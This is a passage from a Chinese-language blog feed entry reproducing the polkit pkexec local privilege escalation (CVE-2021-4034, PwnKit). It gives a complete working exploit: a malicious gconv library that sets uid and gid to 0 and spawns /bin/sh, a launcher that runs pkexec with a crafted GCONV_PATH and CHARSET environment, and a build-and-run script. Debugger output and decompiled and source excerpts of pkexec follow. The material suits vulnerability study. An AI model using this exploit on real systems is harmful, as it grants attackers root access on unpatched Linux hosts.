class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">execve</span>(args[<span class="number">0</span>], args, environ);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是伪造的 <code>gconv-mudules</code>  下的 <code>so</code>  文件，会执行 <code>gconv</code>  和 <code>gconv_init</code> <br> 这个 <code>PATH</code>  就是多个可能的 bin 目标依次遍历<br>这就是 shellcode 了<br>关于这个 <code>setuid</code>  和 <code>setgid</code>  我重新开一章分析</p><h2 id="尾声"><a class="markdownIt-Anchor" href="#尾声">#</a> 尾声</h2><p>既然自己分析完了，就要自己写利用脚本<br>首先是恶意库</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">(<span class="type">void</span> *step)</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *<span class="type">const</span> args[]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> *<span class="type">const</span> envp[]=&#123;</span><br><span class="line"><span class="string">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">execve</span>(args[<span class="number">0</span>],args,envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用 <code>args</code>  的目的就是为了语句复用，没啥特别含义，也能拆成 <code>/bin/sh</code> + <code>argv</code> <br>pkexec 执行的提权</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *<span class="type">const</span> args[]=&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> *<span class="type">const</span> environ[]=&#123;</span><br><span class="line"><span class="string">&quot;evilib.so:.&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line"><span class="string">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class="line"><span class="string">&quot;CHARSET=HACK&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">execve</span>(<span class="string">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://poc.sh">poc.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp exp.c</span><br><span class="line">mkdir GCONV_PATH=.</span><br><span class="line">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class="line">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; gconv-modules</span><br><span class="line">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><h2 id="补充调试"><a class="markdownIt-Anchor" href="#补充调试">#</a> 补充调试</h2><p><a href="https://hub.docker.com/r/chenaotian/cve-2021-4034">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png" alt="image"></p><p>两次结果对比</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02:0010│     0x7fffa507a720 —▸ 0x7fffa507bfad ◂— &#x27;pwnkitdir&#x27;</span><br><span class="line">03:0018│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class="line">04:0020│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class="line">05:0028│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rax 0x7fffa507a720 —▸ 0x55b966a37f50 ◂— &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class="line">01:0008│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class="line">02:0010│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class="line">03:0018│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure><p>ida 审计到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( *v19 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    program_in_path = g_find_program_in_path(v19);</span><br><span class="line">    v21 = program_in_path;</span><br><span class="line">    <span class="keyword">if</span> ( program_in_path )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = v7;</span><br><span class="line">      v7 = (gchar *)program_in_path;</span><br><span class="line">      g_free(v22);</span><br><span class="line">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    v38 = v7;</span><br><span class="line">    v37 = strerror(<span class="number">2</span>);</span><br><span class="line">    v36 = <span class="string">&quot;Cannot run program %s: %s\n&quot;</span>;</span><br><span class="line">LABEL_55:</span><br><span class="line">    v8 = <span class="number">127</span>;</span><br></pre></td></tr></table></figure><p>根据字符串定位到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)g_strcmp0(type, <span class="string">&quot;SHELL&quot;</span>) )<span class="comment">// 获取到SHELL的环境变量</span></span><br><span class="line">      &#123;</span><br><span class="line">        v151 = <span class="number">0LL</span>;</span><br><span class="line">        v152[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)g_file_get_contents(<span class="string">&quot;/etc/shells&quot;</span>, &amp;v151, <span class="number">0LL</span>, v152) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = <span class="number">0</span>;</span><br><span class="line">          v29 = g_strsplit(v151, <span class="string">&quot;\n&quot;</span>, <span class="number">0LL</span>);<span class="comment">//shells</span></span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;<span class="comment">// 如果终止条件满足</span></span><br><span class="line">            <span class="keyword">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class="number">8LL</span> * v28)) == <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v31 = v29;</span><br><span class="line">              v6 = (<span class="type">const</span> <span class="type">char</span> **)subjecta;</span><br><span class="line">              v7 = local_agent_handle;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_47;<span class="comment">// 直接跳过去</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)g_strcmp0(v27, v30) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            ++v28;</span><br><span class="line">          &#125;</span><br><span class="line">          g_free(v151);</span><br><span class="line">          g_strfreev(v29);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = (<span class="type">const</span> <span class="type">char</span> **)subjecta;</span><br><span class="line">        v7 = local_agent_handle;</span><br><span class="line">        v31 = <span class="number">0LL</span>;</span><br><span class="line">        g_printerr(<span class="string">&quot;Error getting contents of /etc/shells: %s\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(v152[<span class="number">0</span>] + <span class="number">8</span>));</span><br><span class="line">        g_error_free(v152[<span class="number">0</span>]);</span><br><span class="line">LABEL_47:</span><br><span class="line">        g_free(v151);</span><br><span class="line">        g_strfreev(v31);</span><br><span class="line">        log_message(<span class="number">2</span>, <span class="number">1</span>, <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)g_file_get_contents(<span class="string">&quot;/etc/shells&quot;</span>, &amp;v151, <span class="number">0LL</span>, v152) )</span><br><span class="line">LABEL_48:</span><br><span class="line">        v32 = <span class="string">&quot;\nThis incident has been reported.\n&quot;</span>;</span><br><span class="line">LABEL_49:</span><br><span class="line">        v8 = <span class="number">127</span>;</span><br><span class="line">        g_printerr(v32);</span><br><span class="line">        g_free(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p><code>v28</code>  是 idx，可以得知这是个数组<br>反馈到源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shells = g_strsplit (contents, <span class="string">&quot;\n&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; shells != <span class="literal">NULL</span> &amp;&amp; shells[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_strcmp0 (shell, shells[n]) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        ret = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在后面调用了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class="line"><span class="comment">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class="line"><span class="comment">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!validate_environment_variable (key, value))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">然后里面又调用了---------------------------------------------------</span><br><span class="line">  <span class="comment">/* special case $SHELL */</span></span><br><span class="line">  <span class="keyword">if</span> (g_strcmp0 (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">      <span class="keyword">if</span> (!is_valid_shell (value))</span><br><span class="line">        &#123;</span><br><span class="line">          log_message (LOG_CRIT, TRUE,</span><br><span class="line">                       <span class="string">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class="line">          g_printerr (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">  <span class="keyword">for</span> (n = <span class="number">0</span>; shells != <span class="literal">NULL</span> &amp;&amp; shells[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (g_strcmp0 (shell, shells[n]) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          ret = TRUE;</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  g_free (contents);</span><br><span class="line">  g_strfreev (shells);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#参考&quot;&gt;#&lt;/a&gt; 参考&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-271423.htm&quot;&gt;看雪大爹&lt;/a&gt;&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="CVE recur" scheme="https://squirre17.github.io/categories/CVE-recur/"/>
    
    
    <category term="Linux" scheme="https://squirre17.github.io/tags/Linux/"/>
    
    <category term="User state" scheme="https://squirre17.github.io/tags/User-state/"/>
    
  </entry>
  
</feed>
